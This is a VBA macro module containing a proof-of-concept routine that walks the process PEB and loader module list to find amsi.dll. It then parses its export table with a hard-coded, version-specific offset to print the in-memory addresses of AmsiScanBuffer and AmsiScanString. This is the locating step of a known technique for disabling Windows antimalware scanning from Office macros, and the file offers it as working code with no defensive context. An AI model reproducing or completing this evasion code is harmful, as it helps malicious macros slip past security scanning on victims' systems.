Attribute VB_Name = "Module1"
Private Type ProcessWow64Information
    ExitStatus      As LongPtr
    Reserved0       As LongPtr
    PebBaseAddress  As LongPtr
    AffinityMask    As LongPtr
    BasePriority    As LongPtr
    Reserved1       As LongPtr
    UniqueProcessId As LongPtr
    InheritedFromUniqueProcessId    As LongPtr
End Type

Private Declare PtrSafe Function ZwQueryInformationProcess Lib "ntdll.dll" ( _
   ByVal ProcessHandle As LongPtr, _
   ByVal ProcessInformationClass As LongPtr, _
   ByRef ProcessInformation As ProcessWow64Information, _
   ByVal ProcessInformationLength As Long, _
   ByRef ReturnLength As Long _
) As Integer

Declare PtrSafe Sub Peek Lib "msvcrt" Alias "memcpy" (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)

Sub POC()

    Dim size As Long
    Dim pbi As ProcessWow64Information
    Dim dll_table_entry As LongPtr
    Dim current_dll_table_entry As LongPtr
    
    Dim Ldr_Data As LongPtr
    Dim Ldr_Data_InLoadOrderModuleList_Start As LongPtr
    Dim Ldr_Data_InLoadOrderModuleList_End As LongPtr
    Dim Ldr_Data_Table_Entry_BaseDll As LongPtr
    Dim Ldr_Data_Table_Entry_BaseDllAdr As LongPtr
    
    Dim Ldr_Data_Table_Entry_BaseDllName As LongPtr
    Dim Ldr_Data_Table_Entry_BaseDllName_Buffer As LongPtr
    Dim Ldr_Data_Table_Entry_BaseDllName_BufferAdr As LongPtr
    
    Dim IMAGE_EXPORT_DIRECTORY As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_Adr_of_Functions As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_FunctionStart As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_FunctionStartAdr As LongPtr
    
    Dim AS_String_Adr As LongPtr
    Dim AS_Buffer_Adr As LongPtr
    
    Dim Temp As Long
    Dim Result As String
    Dim btg As LongPtr
    Dim i As Integer
    
    Result = ZwQueryInformationProcess(-1, 0, pbi, Len(pbi), size)
    Debug.Print "PEB Address: " & Hex(pbi.PebBaseAddress)
    
    Peek Ldr_Data, ByVal (pbi.PebBaseAddress + &H18), 8
    Debug.Print "Ldr_Data: " & Hex(Ldr_Data)
    
    Peek Ldr_Data_InLoadOrderModuleList_Start, ByVal (Ldr_Data + &H10), 8
    Debug.Print "Ldr_Data_InLoadOrderModuleList_Start: " & Hex(Ldr_Data_InLoadOrderModuleList_Start)
    
    Peek Ldr_Data_InLoadOrderModuleList_End, ByVal (Ldr_Data + &H18), 8
    Debug.Print "Ldr_Data_InLoadOrderModuleList_End: " & Hex(Ldr_Data_InLoadOrderModuleList_End)

    dll_table_entry = Ldr_Data_InLoadOrderModuleList_Start
    Do Until dll_table_entry = Ldr_Data_InLoadOrderModuleList_End
        current_dll_table_entry = dll_table_entry
        
        Peek dll_table_entry, ByVal (current_dll_table_entry), 8
        'Debug.Print Hex(dll_table_entry)
                
        Ldr_Data_Table_Entry_BaseDll = current_dll_table_entry + &H30
        Peek Ldr_Data_Table_Entry_BaseDllAdr, ByVal (Ldr_Data_Table_Entry_BaseDll), 8
                
        Ldr_Data_Table_Entry_BaseDllName = current_dll_table_entry + &H58
        Ldr_Data_Table_Entry_BaseDllName_Buffer = Ldr_Data_Table_Entry_BaseDllName + &H8
        
        Peek Ldr_Data_Table_Entry_BaseDllName_BufferAdr, ByVal (Ldr_Data_Table_Entry_BaseDllName_Buffer), 8
        'Debug.Print Hex(Ldr_Data_Table_Entry_BaseDllName_BufferAdr)
        
        Result = ""
        For i = 0 To 4
            btg = Ldr_Data_Table_Entry_BaseDllName_BufferAdr + (i * 4)
            Peek Temp, ByVal (btg), 4
            Result = Result & StringBuilder(Temp)
        Next i
        
        If InStr(1, Result, "616D73692E646C6C", vbTextCompare) Then
            Debug.Print "We've found amsi.dll"
            Debug.Print "Current DLL Table Entry: " & Hex(current_dll_table_entry)
            Debug.Print "DLL Base Address: " & Hex(Ldr_Data_Table_Entry_BaseDllAdr)
            
            IMAGE_EXPORT_DIRECTORY = Ldr_Data_Table_Entry_BaseDllAdr + "58560" 'E4C0
            'Debug.Print "IMAGE_EXPORT_DIRECTORY: " & Hex(IMAGE_EXPORT_DIRECTORY)

            IMAGE_EXPORT_DIRECTORY_Adr_of_Functions = (IMAGE_EXPORT_DIRECTORY + &H1C)
            'Debug.Print "IMAGE_EXPORT_DIRECTORY_Adr_of_Functions: " & Hex(IMAGE_EXPORT_DIRECTORY_Adr_of_Functions)
            
            Peek IMAGE_EXPORT_DIRECTORY_FunctionStart, ByVal (IMAGE_EXPORT_DIRECTORY_Adr_of_Functions), 4
            'Debug.Print Hex(IMAGE_EXPORT_DIRECTORY_FunctionStart)
            
            IMAGE_EXPORT_DIRECTORY_FunctionStartAdr = Ldr_Data_Table_Entry_BaseDllAdr + IMAGE_EXPORT_DIRECTORY_FunctionStart
            Debug.Print "Function Addresses Start at:" & Hex(IMAGE_EXPORT_DIRECTORY_FunctionStartAdr)
            
            Peek Temp, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + 12), 4
            AS_Buffer_Adr = Ldr_Data_Table_Entry_BaseDllAdr + Temp
            Debug.Print "Amsi Scan Buffer Found at:" & Hex(AS_Buffer_Adr)
            
            Peek Temp, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + 16), 4
            AS_String_Adr = Ldr_Data_Table_Entry_BaseDllAdr + Temp
            Debug.Print "Amsi Scan String Found at:" & Hex(AS_String_Adr)
              
            Exit Do
        End If
    
    Loop

End Sub

Function StringBuilder(Bytes As Long) As String

firstbytes = Hex(Bytes)

firstbytes = Replace(firstbytes, "00", "")
If Len(firstbytes) = 4 Then
    b1 = Mid(firstbytes, 1, 2)
    b2 = Mid(firstbytes, 3, 2)
    firstbytes = b2 & b1
End If

StringBuilder = firstbytes

End Function





